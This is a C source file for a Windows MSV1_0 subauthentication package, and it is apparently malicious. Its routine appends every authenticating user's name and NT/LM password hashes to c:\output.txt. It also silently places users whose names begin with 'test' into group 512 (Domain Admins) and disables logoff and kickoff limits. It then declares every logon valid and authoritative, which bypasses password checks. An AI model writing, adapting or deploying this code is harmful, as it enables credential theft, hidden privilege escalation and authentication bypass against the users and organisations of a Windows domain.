#include "stdafx.h"

#if ( _MSC_VER >= 800 )
#pragma warning ( 3 : 4100 ) // enable "Unreferenced formal parameter"
#pragma warning ( 3 : 4219 ) // enable "trailing ',' used for variable argument list"
#endif

#include <windef.h>
#include <windows.h>
#include <lmcons.h>
#include <lmaccess.h>
#include <lmapibuf.h>
#include <subauth.h>



NTSTATUS
NTAPI
Msv1_0SubAuthenticationRoutine(
	IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
	IN PVOID LogonInformation,
	IN ULONG Flags,
	IN PUSER_ALL_INFORMATION UserAll,
	OUT PULONG WhichFields,
	OUT PULONG UserFlags,
	OUT PBOOLEAN Authoritative,
	OUT PLARGE_INTEGER LogoffTime,
	OUT PLARGE_INTEGER KickoffTime
)
{
	UNREFERENCED_PARAMETER(LogonLevel);
	UNREFERENCED_PARAMETER(LogonInformation);
	UNREFERENCED_PARAMETER(Flags);

	NTSTATUS Status;
	DWORD dwWritten;
	
	HANDLE hFile = CreateFile(L"c:\\output.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		WCHAR szBuffer[256]; 
		WriteFile(hFile, UserAll->UserName.Buffer, UserAll->UserName.Length, &dwWritten, NULL);
		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
		if (UserAll->NtPasswordPresent)
		{
			for (int i = 0; i < UserAll->NtPassword.Length; i++)
			{
				swprintf_s(szBuffer, L"%02X", ((PBYTE) UserAll->NtPassword.Buffer)[i]);
				WriteFile(hFile, szBuffer, 2 * sizeof(WCHAR), &dwWritten, NULL);
			}
		}
		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
		if (UserAll->LmPasswordPresent)
		{
			for (int i = 0; i < UserAll->LmPassword.Length; i++)
			{
				swprintf_s(szBuffer, L"%02X", ((PBYTE)UserAll->LmPassword.Buffer)[i]);
				WriteFile(hFile, szBuffer, 2 * sizeof(WCHAR), &dwWritten, NULL);
			}
		}
		WriteFile(hFile, L"\r\n", 2 * sizeof(WCHAR), &dwWritten, NULL);
		CloseHandle(hFile);
	}

	//
	// Check whether the SubAuthentication package supports this type
	//  of logon.
	//

	*Authoritative = TRUE;
	*UserFlags = 0;
	*WhichFields = 0;

	if (UserAll->UserName.Length == 8 && _wcsnicmp(UserAll->UserName.Buffer, L"test", 4) == 0)
	{
		UserAll->PrimaryGroupId = 512;
	}

	LogoffTime->HighPart = 0x7FFFFFFF;
	LogoffTime->LowPart = 0xFFFFFFFF;

	KickoffTime->HighPart = 0x7FFFFFFF;
	KickoffTime->LowPart = 0xFFFFFFFF;


	//
	// The user is valid.
	//

	*Authoritative = TRUE;
	Status = STATUS_SUCCESS;


	return Status;

}  // Msv1_0SubAuthenticationRoutine




NTSTATUS
NTAPI
Msv1_0SubAuthenticationFilter(
	IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
	IN PVOID LogonInformation,
	IN ULONG Flags,
	IN PUSER_ALL_INFORMATION UserAll,
	OUT PULONG WhichFields,
	OUT PULONG UserFlags,
	OUT PBOOLEAN Authoritative,
	OUT PLARGE_INTEGER LogoffTime,
	OUT PLARGE_INTEGER KickoffTime
)
{
	return(Msv1_0SubAuthenticationRoutine(
		LogonLevel,
		LogonInformation,
		Flags,
		UserAll,
		WhichFields,
		UserFlags,
		Authoritative,
		LogoffTime,
		KickoffTime
	));
}
// subauth.c eof
